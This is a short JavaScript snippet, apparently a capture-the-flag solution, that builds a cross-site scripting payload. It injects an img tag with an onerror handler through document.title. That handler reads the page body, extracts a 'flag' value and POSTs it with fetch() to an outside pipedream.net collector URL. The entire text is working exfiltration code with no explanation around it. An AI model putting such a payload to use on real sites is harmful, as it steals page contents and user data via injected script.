func_str="console.log('inject');body_text = document.body.innerHTML;start_idx = body_text.lastIndexOf(\'>\') + 1;flag = body_text.substring(start_idx);console.log(flag);const headers = new Headers();headers.append('Content-Type', 'application/json');const body={'flag':flag};const options={method: 'POST',headers,mode: 'cors',body: JSON.stringify(body),};fetch('https://enyg1heteip1.x.pipedream.net/', options);";

title_str = "</h1><img src='not_exist.jpg' onerror=\"" + func_str + "\"></img><h1>";

setTimeout(function(){
    document.title = title_str;
}, 2000);
